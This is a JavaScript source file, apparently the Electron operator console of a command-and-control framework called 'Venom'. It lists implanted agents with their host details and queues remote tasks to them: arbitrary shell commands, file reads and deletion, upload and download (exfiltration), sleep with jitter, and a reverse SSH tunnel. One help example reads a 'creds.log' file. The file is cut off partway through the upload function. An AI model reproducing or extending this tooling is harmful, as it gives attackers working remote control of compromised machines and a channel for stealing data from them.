const { ipcRenderer } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { remote } = require('electron');
const { Menu, MenuItem } = remote || {};
const { log } = require('console');

// Agent class definition (copied from dashboard.js)
class Agent {
    constructor(agentData) {
        this.agent_id = agentData.agent_id;
        this.hostname = agentData.system_info.hostname;
        this.username = agentData.system_info.username;
        this.pid = agentData.system_info.pid;
        this.ip_addresses = agentData.system_info.ip_addresses;
        this.os_info = agentData.system_info.os_info;
        this.last_seen = agentData.last_seen;
        this.is_new = true;
    }

    update(agentData) {
        this.hostname = agentData.system_info.hostname;
        this.username = agentData.system_info.username;
        this.pid = agentData.system_info.pid;
        this.ip_addresses = agentData.system_info.ip_addresses;
        this.os_info = agentData.system_info.os_info;
        this.last_seen = agentData.last_seen;
    }

    markAsExisting() {
        this.is_new = false;
    }
}

// Helper function to format time difference (copied from dashboard.js)
function formatTimeDifference(lastSeenTimestamp) {
    const now = new Date();
    const lastSeen = new Date(lastSeenTimestamp);
    const diffMs = now - lastSeen;
    const diffSeconds = Math.floor(diffMs / 1000);
    const diffMinutes = Math.floor(diffSeconds / 60);
    const diffHours = Math.floor(diffMinutes / 60);
    
    if (diffSeconds < 60) {
        return `${diffSeconds}s`;
    } else if (diffMinutes < 60) {
        const remainingSeconds = diffSeconds % 60;
        return `${diffMinutes}:${remainingSeconds.toString().padStart(2, '0')}`;
    } else {
        const remainingMinutes = diffMinutes % 60;
        const remainingSeconds = diffSeconds % 60;
        return `${diffHours}:${remainingMinutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    }
}

function getDownloadsDir() {
    return path.join(os.homedir(), 'Venom', 'downloads');
}

function ensureDownloadsDir() {
    try {
        const dir = getDownloadsDir();
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        return dir;
    } catch (e) {
        log(`[!] ensureDownloadsDir error: ${e.message}`);
        return null;
    }
}

// Global agent object
global.agent;

log(`[+] agent.js loaded`);

const commands = [
    'help', 'ls', 'pwd', 'cd', 'cat', 'mv', 'cp', 'mkdir', 'rmdir', 'write', 'chmod', 'rm', 
    'shell', 'sleep', 'sshrev', 'kill', 'upload', 'download'
];

global.commandHistory = [];
let lastHistoryTimestamp = null; // ISO string of last rendered entry
// Track printed history to avoid double-rendering local command output when
// the same entry later arrives from the server
const printedHistoryKeys = new Set();
// Track recently executed local commands to suppress server echo for same command
const recentLocalCommands = [];
const RECENT_CMD_TTL_MS = 5 * 60 * 1000; // 5 minutes

function historyDedupKey(command, stdout, stderr) {
    return [String(command || ''), String(stdout || ''), String(stderr || '')].join('\u001f');
}
let currentCommandIndex = -1;
let inSearchMode = false;
let filteredHistory = [];
let dropdownSelectedIndex = 0;

// Fixed-height console input: no-op resizer
function autoResizeTextArea(el) { try { if (el) el.style.height = '36px'; } catch (_) {} }

const commandDetails = [
    { name: "help", help: "Display this help menu\r\n" },
    { name: "ls", help: "List directory contents\r\n\tls [path]\r\n\tls ./\r\n\tls C:/Users/user/Desktop/\r\n" },
    { name: "pwd", help: "Show current working directory\r\n\tpwd\r\n" },
    { name: "cd", help: "Change directory\r\n\tcd [path]\r\n\tcd /agent/dst\r\n" },
    { name: "cat", help: "Display file contents\r\n\tcat <file>\r\n\tcat ./kernel.js\r\n\tcat C:/Users/user/Desktop/creds.log\r\n" },
    { name: "mv", help: "Move/rename files or directories\r\n\tmv <src> <dst>\r\n\tmv file.txt newfile.txt\r\n" },
    { name: "cp", help: "Copy files or directories\r\n\tcp <src> <dst>\r\n\tcp file.txt backup.txt\r\n" },
    { name: "mkdir", help: "Create directory\r\n\tmkdir <dir>\r\n\tmkdir newfolder\r\n" },
    { name: "rmdir", help: "Remove empty directory\r\n\trmdir <dir>\r\n\trmdir emptyfolder\r\n" },
    { name: "write", help: "Write content to file\r\n\twrite <path> [content]\r\n\twrite test.txt 'Hello World'\r\n" },
    { name: "chmod", help: "Change file permissions\r\n\tchmod <mode> <path>\r\n\tchmod 755 script.sh\r\n" },
    { name: "rm", help: "Remove (delete) files\r\n\trm <path>\r\n\trm file.txt\r\n" },
    { name: "shell", help: "Execute raw shell command\r\n\tshell <command>\r\n\tshell whoami\r\n" },
    { name: "sleep", help: "Make agent sleep with optional jitter\r\n\tsleep <seconds> [jitter%]\r\n\tsleep 20 15\r\n" },
    { name: "sshrev", help: "Create reverse SSH tunnel\r\n\tsshrev <key> <port> <user> <host>\r\n\tsshrev id_rsa 2222 user target.com\r\n" },
    { name: "kill", help: "Terminate agent process\r\n\tkill\r\n" },
    { name: "upload", help: "Upload a file from your local operator box to the remote agent box\r\n\tupload [local_path] [remote_path]\r\n\tupload /operator/src/file /agent/dst/file\r\n" },
    { name: "download", help: "Download a file from remote agent box to local operator box\r\n\tdownload [remote_path]\r\n\tdownload /agent/src/file\r\n\t- Get from View > Downloads\r\n" },
];

function getHelpInfo(command) {
    try {
        const parts = command.split(' ').filter(part => part !== '');
        if (parts.length > 1) {
            const cmdName = parts[1];
            const cmd = commandDetails.find(c => c.name === cmdName);
            return cmd ? cmd.help : `No help available for command: ${cmdName}`;
        } else {
            return "Command name missing. Use 'help <commandName>'.";
        }
    } catch (error) {
        log(`[!] getHelpInfo ${error.message}\r\n${error.stack}`);
        return 'Error retrieving help information.';
    }
}

function showHelp() {
    try {
        const maxLength = commandDetails.reduce((max, cmd) => {
        return cmd.name.length > max ? cmd.name.length : max;
        }, 0);
        commandDetails.forEach(thiscmd => {
        const paddedName = thiscmd.name.padEnd(maxLength, ' ');
        let cmdhelp = thiscmd.help.split('\r\n');
        cmdhelp = cmdhelp[0];
        printToConsole(`<i style="color:#c0c0c0">${paddedName} : ${cmdhelp}</i>`);
        });
    } catch (error) {
        log(`[!] showHelp ${error.message}\r\n${error.stack}`);
    }
}

async function sendCommand() {
    const input = document.getElementById('consoleInput');
    let command = (input.value || '').replace(/\n/g, ' ').trim();
    command = command.trim();
    log(`sendCommand : ${command}`);
    
    if (!command) {
        input.value = '';
        return;
    }
    
    // Use configured auth username (from main process) for the PS1 user display
    let cfgUsername = null;
    try {
        const cfg = await ipcRenderer.invoke('get-config');
        cfgUsername = (cfg && cfg.username) ? String(cfg.username) : null;
    } catch (_) {}
    const promptUser = cfgUsername || (global.agent && global.agent.username) || 'agent';
    let PSString = `<span style="color:#acdff2">[${getFormattedTimestamp()}]</span> <span style="color:#ff0000">${promptUser}</span>`;
    let argv = splitStringWithQuotes(command);
    let UnknownCommand = true;
    
    commandDetails.forEach(thiscmd => {
        if (argv[0] === thiscmd.name) { UnknownCommand = false; }
    });
    
    if (UnknownCommand) {
        printToConsole(`<i><span style="color:#ff0000">[!] Unknown command : "${command}". Type "help" for a list of commands.</span></i>`);
        input.value = '';
        return;
    }
    
    // Clear input immediately
    input.value = '';
    autoResizeTextArea(input);
    
    // Print the command that was executed
    printToConsole(`${PSString} <span style="color:#ffffff">${command}</span>`);
    // Record locally executed command for echo suppression
    try {
        const now = Date.now();
        recentLocalCommands.push({ command, ts: now });
        // GC old entries and cap size
        while (recentLocalCommands.length > 200) recentLocalCommands.shift();
        for (let i = 0; i < recentLocalCommands.length; i++) {
            if (now - recentLocalCommands[i].ts > RECENT_CMD_TTL_MS) {
                recentLocalCommands.splice(i, 1); i--; // remove expired
            }
        }
    } catch (_) {}
    
    let taskId = null;
    const agentId = global.agent ? global.agent.agent_id : null;
    
    try {
        switch (argv[0]) {
            case 'help':
                if (argv.length > 1) {
                    printToConsole(getHelpInfo(command));
                } else {
                    showHelp();
                }
                break;
                
            case 'shell':
                if (argv.length < 2) {
                    printToConsole(`<span style="color:#ff0000">[!] Usage: shell <command></span>`);
                    return;
                }
                const shellCommand = argv.slice(1).join(' ');
                taskId = await createShellTask(shellCommand, agentId);
                break;
                
            case 'sleep':
                if (argv.length < 2) {
                    printToConsole(`<span style="color:#ff0000">[!] Usage: sleep <seconds> [jitter%]</span>`);
                    return;
                }
                const sleepTime = parseInt(argv[1]);
                const jitterPercent = argv.length > 2 ? parseInt(argv[2]) : null;
                taskId = await createSleepTask(sleepTime, jitterPercent, agentId);
                break;
                
            case 'kill':
                taskId = await createKillTask(agentId);
                break;
                
            case 'ls':
                const lsPath = argv.length > 1 ? argv[1] : '.';
                taskId = await createLsTask(lsPath, agentId);
                break;
                
            case 'pwd':
                taskId = await createPwdTask(agentId);
                break;
                
            case 'cd':
                if (argv.length < 2) {
                    printToConsole(`<span style="color:#ff0000">[!] Usage: cd <path></span>`);
                    return;
                }
                taskId = await createCdTask(argv[1], agentId);
                break;
                
            case 'cat':
                if (argv.length < 2) {
                    printToConsole(`<span style="color:#ff0000">[!] Usage: cat <file></span>`);
                    return;
                }
                taskId = await createCatTask(argv[1], agentId);
                break;
                
            case 'mv':
                if (argv.length < 3) { printToConsole(`<span style="color:#ff0000">[!] Usage: mv <src> <dst></span>`); return; }
                taskId = await createMvTask(argv[1], argv[2], agentId);
                break;

            case 'cp':
                if (argv.length < 3) { printToConsole(`<span style="color:#ff0000">[!] Usage: cp <src> <dst></span>`); return; }
                taskId = await createCpTask(argv[1], argv[2], agentId);
                break;

            case 'mkdir':
                if (argv.length < 2) { printToConsole(`<span style="color:#ff0000">[!] Usage: mkdir <dir></span>`); return; }
                taskId = await createMkdirTask(argv[1], agentId);
                break;

            case 'rmdir':
                if (argv.length < 2) { printToConsole(`<span style="color:#ff0000">[!] Usage: rmdir <dir></span>`); return; }
                taskId = await createRmdirTask(argv[1], agentId);
                break;

            case 'write':
                if (argv.length < 2) { printToConsole(`<span style="color:#ff0000">[!] Usage: write <path> [content]</span>`); return; }
                {
                    const writePath = argv[1];
                    const writeContent = argv.length > 2 ? argv.slice(2).join(' ') : '';
                    taskId = await createWriteTask(writePath, writeContent, agentId);
                }
                break;

            case 'chmod':
                if (argv.length < 3) { printToConsole(`<span style="color:#ff0000">[!] Usage: chmod <mode> <path></span>`); return; }
                taskId = await createChmodTask(argv[1], argv[2], agentId);
                break;

            case 'rm':
                if (argv.length < 2) { printToConsole(`<span style="color:#ff0000">[!] Usage: rm <path></span>`); return; }
                taskId = await createRmTask(argv[1], agentId);
                break;

            case 'sshrev':
                if (argv.length < 5) { printToConsole(`<span style="color:#ff0000">[!] Usage: sshrev <key_path> <port> <user> <domain></span>`); return; }
                taskId = await createSshrevTask(argv[1], argv[2], argv[3], argv[4], agentId);
                break;
                
            case 'history':
                // TODO: Implement history command
                break;
                
            case 'upload':
                if (argv.length < 3) {
                    printToConsole(`<span style="color:#ff0000">[!] Usage: upload <local_path> <remote_path></span>`);
                    return;
                }
                const UploadLocalPath = argv[1];
                const UploadRemotePath = argv[2];
                taskId = await createUploadTask(UploadLocalPath, UploadRemotePath, agentId);
                break;
                
            case 'download':
                if (argv.length < 2) {
                    printToConsole(`<span style="color:#ff0000">[!] Usage: download <remote_path></span>`);
                    return;
                }
                const DownloadRemotePath = argv[1];
                taskId = await createDownloadTask(DownloadRemotePath, agentId);
                break;
                
            default:
                printToConsole(`<span style="color:#ff0000">[!] Command "${argv[0]}" not yet implemented</span>`);
                return;
        }
        
        // If a task was created, monitor it
        if (taskId) {
            const monitorRes = await monitorTask(taskId);
            if (monitorRes && monitorRes.success) {
                // Server already logs history. Keep a local append for fast CTRL+R and scroll.
                saveHistoryEntry(command, monitorRes.stdout, monitorRes.stderr);
            }
        }
        
    } catch (error) {
        log(`[!] sendCommand error: ${error.message}`);
        printToConsole(`<span style="color:#ff0000">[!] Error executing command: ${error.message}</span>`);
    }
}

async function printToConsole(message) {
    try {
        const consoleOutput = document.getElementById('consoleOutput');
        const newLine = document.createElement('div');
        newLine.innerHTML = message;
        consoleOutput.appendChild(newLine);
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
    } catch (error) {
        log(`[!] printToConsole ${error.message}\r\n${error.stack}`);
    }
}

// Function to update the agent check-in table
async function updateCheckin() {
    try {
        if (!global.agent) {
            log('No agent data available for updateCheckin');
            return;
        }

        // Get all agents data (same as dashboard)
        let agents = await ipcRenderer.invoke('list-agents');
        
        if (agents != 0 && agents.agents) {
            // Find the specific agent in the agents list
            const agentData = agents.agents.find(agent => agent.agent_id === global.agent.agent_id);
            
            if (agentData) {
                // Update the global agent object with fresh data
                global.agent.update(agentData);
                
                // Update the table row with the new data
                const agentDataRow = document.getElementById('agentDataRow');
                if (agentDataRow) {
                    agentDataRow.cells[0].textContent = global.agent.agent_id;
                    agentDataRow.cells[1].textContent = global.agent.hostname;
                    agentDataRow.cells[2].textContent = global.agent.username;
                    agentDataRow.cells[3].textContent = global.agent.pid;
                    agentDataRow.cells[4].textContent = global.agent.ip_addresses;
                    agentDataRow.cells[5].textContent = global.agent.os_info;
                    
                    // Format last_seen based on whether agent is new or existing
                    if (global.agent.is_new) {
                        agentDataRow.cells[6].textContent = global.agent.last_seen;
                        global.agent.markAsExisting(); // Mark as no longer new
                    } else {
                        agentDataRow.cells[6].textContent = formatTimeDifference(global.agent.last_seen);
                    }
                }
            }
        }
    } catch (error) {
        log(`[!] updateCheckin(): ${error.message} ${error.stack}`);
    }
}

function getHistoryDir() {
    return path.join(os.homedir(), 'Venom', 'history');
}

function ensureHistoryDir() {
    try {
        const dir = getHistoryDir();
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        return dir;
    } catch (e) {
        log(`[!] ensureHistoryDir error: ${e.message}`);
        return null;
    }
}

function getHistoryFilePath(hostname) {
    const dir = ensureHistoryDir();
    if (!dir) return null;
    const safeHost = (hostname || 'unknown').replace(/[^a-zA-Z0-9_.-]/g, '_');
    return path.join(dir, `${safeHost}.hist`);
}

function appendCommandToMemoryHistory(command) {
    if (!command || !command.trim()) return;
    // Avoid consecutive duplicates
    if (global.commandHistory.length === 0 || global.commandHistory[global.commandHistory.length - 1] !== command) {
        global.commandHistory.push(command);
        if (global.commandHistory.length > 500) {
            global.commandHistory = global.commandHistory.slice(-500);
        }
    }
    currentCommandIndex = global.commandHistory.length;
}

function saveHistoryEntry(command, stdout, stderr) {
    try {
        // Mark as printed to suppress future duplicate renders from server
        try { printedHistoryKeys.add(historyDedupKey(command, stdout, stderr)); } catch (_) {}
        const hostname = (global.agent && global.agent.hostname) || 'unknown';
        const filePath = getHistoryFilePath(hostname);
        if (!filePath) return;
        const entry = {
            timestamp: new Date().toISOString(),
            command,
            stdout: stdout || '',
            stderr: stderr || ''
        };
        fs.appendFileSync(filePath, JSON.stringify(entry) + '\n');
        appendCommandToMemoryHistory(command);
    } catch (e) {
        log(`[!] saveHistoryEntry error: ${e.message}`);
    }
}

async function renderHistoryEntry(entry) {
    if (!entry) return;
    // Skip if we already printed this combination of command/stdout/stderr locally
    try {
        const key = historyDedupKey(entry.command, entry.stdout, entry.stderr);
        if (printedHistoryKeys.has(key)) {
            return;
        }
        printedHistoryKeys.add(key);
    } catch (_) {}
    // If this entry was executed by the current operator, skip rendering to avoid
    // showing our own command/output a second time
    try {
        const cfg = await ipcRenderer.invoke('get-config');
        const myUser = (cfg && cfg.username) ? String(cfg.username) : null;
        if (myUser && entry && typeof entry.operator === 'string' && entry.operator === myUser) {
            return;
        }
    } catch (_) {}
    // Suppress if this command matches a recently executed local command
    try {
        const ets = entry && entry.timestamp ? Date.parse(entry.timestamp) : NaN;
        for (const rc of recentLocalCommands) {
            if (rc.command === entry.command) {
                if (!isNaN(ets)) {
                    if (Math.abs(ets - rc.ts) <= RECENT_CMD_TTL_MS) return;
                } else {
                    // If entry timestamp missing, still skip by command match
                    return;
                }
            }
        }
    } catch (_) {}
    const ts = formatTimestampLikePS1(entry.timestamp);
    // Determine which user to show: server-provided operator, else configured username
    let user = entry.operator || null;
    if (!user) {
        try {
            const cfg = await ipcRenderer.invoke('get-config');
            user = (cfg && cfg.username) ? String(cfg.username) : null;
        } catch (_) {}
    }
    if (!user) user = (global.agent && global.agent.username) || 'agent';
    const header = `<span style=\"color:#acdff2\">[${ts}]</span> <span style=\"color:#ff0000\">${user}</span> <span style=\"color:#ffffff\">${entry.command}</span>`;
    printToConsole(header);
    if (entry.stdout) {
        printToConsole(`<span style=\"color:#ffffff\">${entry.stdout}</span>`);
    }
    if (entry.stderr) {
        printToConsole(`<span style=\"color:#ff6666\">${entry.stderr}</span>`);
    }
}

async function loadAndRenderHistory() {
    try {
        const hostname = (global.agent && global.agent.hostname) || 'unknown';
        // Pull last 200 commands from server
        // Get hosts to resolve host_id from hostname, then fetch by id
        const hostsRes = await prepareRequest({ path: '/api/client/history/hosts', method: 'GET' });
        let hostId = null;
        if (hostsRes && hostsRes.success && Array.isArray(hostsRes.hosts)) {
            const found = hostsRes.hosts.find(h => h.hostname === hostname);
            if (found) hostId = found.host_id;
        }
        const res = hostId ? await prepareRequest({ path: `/api/client/history/${encodeURIComponent(hostId)}?limit=200`, method: 'GET' }) : null;
        let entries = [];
        if (res && res.success && Array.isArray(res.entries)) {
            entries = res.entries;
            // Save locally for CTRL+R and offline scroll
            const filePath = getHistoryFilePath(hostname);
            ensureHistoryDir();
            try {
                const lines = entries.map(e => JSON.stringify(e)).join('\n') + '\n';
                fs.writeFileSync(filePath, lines, { encoding: 'utf-8' });
            } catch (_) {}
        } else {
            // Fallback to local last 200
            const filePath = getHistoryFilePath(hostname);
            if (filePath && fs.existsSync(filePath)) {
                const lines = fs.readFileSync(filePath, 'utf-8').split('\n').filter(Boolean);
                const last = lines.slice(-200);
                entries = last.map(l => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
            }
        }
        global.commandHistory = entries.map(e => e.command).filter(Boolean);
        currentCommandIndex = global.commandHistory.length;
        entries.forEach(renderHistoryEntry);
        if (entries.length > 0) {
            lastHistoryTimestamp = entries[entries.length - 1].timestamp || lastHistoryTimestamp;
        }
    } catch (e) {
        log(`[!] loadAndRenderHistory error: ${e.message}`);
    }
}

async function pollAndRenderHistoryUpdates() {
    try {
        const hostname = (global.agent && global.agent.hostname) || 'unknown';
        const hostsRes = await prepareRequest({ path: '/api/client/history/hosts', method: 'GET' });
        let hostId = null;
        if (hostsRes && hostsRes.success && Array.isArray(hostsRes.hosts)) {
            const found = hostsRes.hosts.find(h => h.hostname === hostname);
            if (found) hostId = found.host_id;
        }
        const res = hostId ? await prepareRequest({ path: `/api/client/history/${encodeURIComponent(hostId)}?limit=200`, method: 'GET' }) : null;
        if (!res || !res.success || !Array.isArray(res.entries)) return;
        const entries = res.entries;
        if (!entries.length) return;
        const newEntries = lastHistoryTimestamp
            ? entries.filter(e => (e.timestamp || '') > lastHistoryTimestamp)
            : entries;
        if (!newEntries.length) return;
        // Append locally and render
        const filePath = getHistoryFilePath(hostname);
        ensureHistoryDir();
        try {
            const lines = newEntries.map(e => JSON.stringify(e)).join('\n') + '\n';
            fs.appendFileSync(filePath, lines, { encoding: 'utf-8' });
        } catch (_) {}
        newEntries.forEach(renderHistoryEntry);
        // Update in-memory command list
        newEntries.forEach(e => appendCommandToMemoryHistory(e.command));
        lastHistoryTimestamp = entries[entries.length - 1].timestamp || lastHistoryTimestamp;
    } catch (e) {
        log(`[!] pollAndRenderHistoryUpdates error: ${e.message}`);
    }
}

function showCommandDropdown(matches, anchorInput) {
    const dropdown = document.getElementById('commandDropdown');
    if (!dropdown) return;
    dropdown.innerHTML = '';
    // Prepare width alignment with the input
    try {
        const left = anchorInput.offsetLeft || 0;
        const width = anchorInput.offsetWidth || anchorInput.getBoundingClientRect().width || 0;
        dropdown.style.left = `${left}px`;
        dropdown.style.width = `${width}px`;
    } catch (_) {}
    matches.slice(0, 10).forEach((cmd, idx) => {
        const div = document.createElement('div');
        div.textContent = cmd;
        if (idx === dropdownSelectedIndex) div.style.backgroundColor = '#555';
        div.addEventListener('mousedown', (e) => {
            e.preventDefault();
            anchorInput.value = cmd;
            hideCommandDropdown();
        });
        dropdown.appendChild(div);
    });
    // Always drop UP from the input so it's visible above the console bottom
    if (matches.length) {
        dropdown.style.visibility = 'hidden';
        dropdown.style.display = 'block';
        const approxItemH = 22;
        // With fixed height input, keep a sensible dropdown size using viewport
        const dynamicMax = Math.max(140, Math.min(Math.floor(window.innerHeight * 0.5), 300));
        const desiredH = Math.min(dynamicMax, approxItemH * Math.min(matches.length, 50));
        // Available space above is the input's offsetTop within the .input container
        const availAbove = (anchorInput.offsetTop || 0) - 6; // leave small gap
        const maxH = Math.min(dynamicMax, Math.max(40, availAbove));
        dropdown.style.maxHeight = `${maxH}px`;
        const realH = Math.min(desiredH, maxH);
        const topPos = (anchorInput.offsetTop || 0) - realH - 6;
        dropdown.style.top = `${Math.max(0, topPos)}px`;
        dropdown.style.visibility = 'visible';
    } else {
        dropdown.style.display = 'none';
    }
    inSearchMode = matches.length > 0;
}

function hideCommandDropdown() {
    const dropdown = document.getElementById('commandDropdown');
    if (!dropdown) return;
    dropdown.style.display = 'none';
    dropdown.innerHTML = '';
    inSearchMode = false;
}

function updateSearchDropdown(inputEl) {
    const q = inputEl.value || '';
    if (!q) {
        hideCommandDropdown();
        return;
    }
    filteredHistory = global.commandHistory.filter(c => c.toLowerCase().includes(q.toLowerCase())).reverse();
    dropdownSelectedIndex = 0;
    showCommandDropdown(filteredHistory, inputEl);
}

function updateDropdownHighlight() {
    const dropdown = document.getElementById('commandDropdown');
    if (!dropdown || dropdown.style.display === 'none') return;
    const items = dropdown.children;
    for (let i = 0; i < items.length; i++) {
        items[i].style.backgroundColor = (i === dropdownSelectedIndex) ? '#555' : 'transparent';
    }
}

function acceptDropdownSelection(inputEl) {
    if (!filteredHistory || filteredHistory.length === 0) return;
    const choice = filteredHistory[Math.max(0, Math.min(dropdownSelectedIndex, filteredHistory.length - 1))];
    if (choice) {
        inputEl.value = choice;
        hideCommandDropdown();
        try { inputEl.setSelectionRange(inputEl.value.length, inputEl.value.length); } catch(_) {}
    }
}

// Task creation functions (based on Python client pattern)
async function createShellTask(command, agentId = null) {
    const data = {
        'type': 'shell',
        'command': command
    };
    
    if (agentId) {
        data['agent_id'] = agentId;
    }
    
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    
    if (result && result.success) {
        const taskId = result.task_id;
        // printToConsole(`<span style="color:#00ff00">✓ Shell task created successfully</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Task ID: ${taskId}</span>`);
        printToConsole(`<span style="color:#87ceeb">ℹ Command: ${command}</span>`);
        return taskId;
    } else {
        printToConsole(`<span style="color:#ff0000">✗ Failed to create shell task</span>`);
        return null;
    }
}

async function createSleepTask(sleepTime, jitterPercent = null, agentId = null) {
    const data = {
        'type': 'sleep',
        'sleep_time': sleepTime
    };
    
    if (jitterPercent !== null) {
        data['jitter_percent'] = jitterPercent;
    }
    
    if (agentId) {
        data['agent_id'] = agentId;
    }
    
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    
    if (result && result.success) {
        const taskId = result.task_id;
        // printToConsole(`<span style="color:#00ff00">✓ Sleep task created successfully</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Task ID: ${taskId}</span>`);
        if (jitterPercent !== null) {
            printToConsole(`<span style="color:#87ceeb">ℹ Sleep time: ${sleepTime} seconds with ${jitterPercent}% jitter</span>`);
        } else {
            printToConsole(`<span style="color:#87ceeb">ℹ Sleep time: ${sleepTime} seconds (default 25% jitter)</span>`);
        }
        return taskId;
    } else {
        printToConsole(`<span style="color:#ff0000">✗ Failed to create sleep task</span>`);
        return null;
    }
}

async function createKillTask(agentId = null) {
    const data = {
        'type': 'kill'
    };
    
    if (agentId) {
        data['agent_id'] = agentId;
    }
    
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    
    if (result && result.success) {
        const taskId = result.task_id;
        // printToConsole(`<span style="color:#00ff00">✓ Kill task created successfully</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Task ID: ${taskId}</span>`);
        if (agentId) {
            printToConsole(`<span style="color:#ffa500">⚠ Agent ${agentId} will be terminated</span>`);
        } else {
            printToConsole(`<span style="color:#ffa500">⚠ Next available agent will be terminated</span>`);
        }
        return taskId;
    } else {
        printToConsole(`<span style="color:#ff0000">✗ Failed to create kill task</span>`);
        return null;
    }
}

async function createLsTask(pathArg = '.', agentId = null) {
    const data = {
        'type': 'ls',
        'path': pathArg || '.'
    };
    
    if (agentId) {
        data['agent_id'] = agentId;
    }
    
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    
    if (result && result.success) {
        const taskId = result.task_id;
        // printToConsole(`<span style="color:#00ff00">✓ ls task created successfully</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Task ID: ${taskId}</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Path: ${pathArg}</span>`);
        return taskId;
    } else {
        printToConsole(`<span style="color:#ff0000">✗ Failed to create ls task</span>`);
        return null;
    }
}

async function createPwdTask(agentId = null) {
    const data = {
        'type': 'pwd'
    };
    
    if (agentId) {
        data['agent_id'] = agentId;
    }
    
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    
    if (result && result.success) {
        const taskId = result.task_id;
        // printToConsole(`<span style="color:#00ff00">✓ pwd task created successfully</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Task ID: ${taskId}</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Task ID: ${taskId}</span>`);
        return taskId;
    } else {
        printToConsole(`<span style="color:#ff0000">✗ Failed to create pwd task</span>`);
        return null;
    }
}

async function createCdTask(pathArg, agentId = null) {
    const data = {
        'type': 'cd',
        'path': pathArg
    };
    
    if (agentId) {
        data['agent_id'] = agentId;
    }
    
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    
    if (result && result.success) {
        const taskId = result.task_id;
        // printToConsole(`<span style="color:#00ff00">✓ cd task created successfully</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Task ID: ${taskId}</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Path: ${pathArg}</span>`);
        return taskId;
    } else {
        printToConsole(`<span style="color:#ff0000">✗ Failed to create cd task</span>`);
        return null;
    }
}

async function createCatTask(pathArg, agentId = null) {
    const data = {
        'type': 'cat',
        'path': pathArg
    };
    
    if (agentId) {
        data['agent_id'] = agentId;
    }
    
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    
    if (result && result.success) {
        const taskId = result.task_id;
        // printToConsole(`<span style="color:#00ff00">✓ cat task created successfully</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ Task ID: ${taskId}</span>`);
        // printToConsole(`<span style="color:#87ceeb">ℹ File: ${pathArg}</span>`);
        return taskId;
    } else {
        printToConsole(`<span style="color:#ff0000">✗ Failed to create cat task</span>`);
        return null;
    }
}

async function createMvTask(src, dst, agentId = null) {
    const data = { type: 'mv', src, dst };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create mv task</span>`), null);
}

async function createCpTask(src, dst, agentId = null) {
    const data = { type: 'cp', src, dst };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create cp task</span>`), null);
}

async function createMkdirTask(pathArg, agentId = null) {
    const data = { type: 'mkdir', path: pathArg };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create mkdir task</span>`), null);
}

async function createRmdirTask(pathArg, agentId = null) {
    const data = { type: 'rmdir', path: pathArg };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create rmdir task</span>`), null);
}

async function createWriteTask(pathArg, content, agentId = null) {
    const data = { type: 'write', path: pathArg, content: content || '' };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create write task</span>`), null);
}

async function createChmodTask(mode, pathArg, agentId = null) {
    const data = { type: 'chmod', mode, path: pathArg };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create chmod task</span>`), null);
}

async function createRmTask(pathArg, agentId = null) {
    const data = { type: 'rm', path: pathArg };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create rm task</span>`), null);
}

async function createSshrevTask(keyPath, port, user, domain, agentId = null) {
    const data = { type: 'sshrev', key_path: keyPath, port, user, domain };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create sshrev task</span>`), null);
}

// Create download task (remote agent -> local operator via server)
async function createDownloadTask(remotePath, agentId = null) {
    const data = { type: 'download', file_path: remotePath, remote_path: remotePath };
    if (agentId) data.agent_id = agentId;
    const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
    return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create download task</span>`), null);
}

// Create upload task (local operator -> remote agent)
async function createUploadTask(localPath, remotePath, agentId = null) {
    try {
        if (!localPath) {
            printToConsole(`<span style="color:#ff0000">[!] Upload requires a local path</span>`);
            return null;
        }
        if (!fs.existsSync(localPath)) {
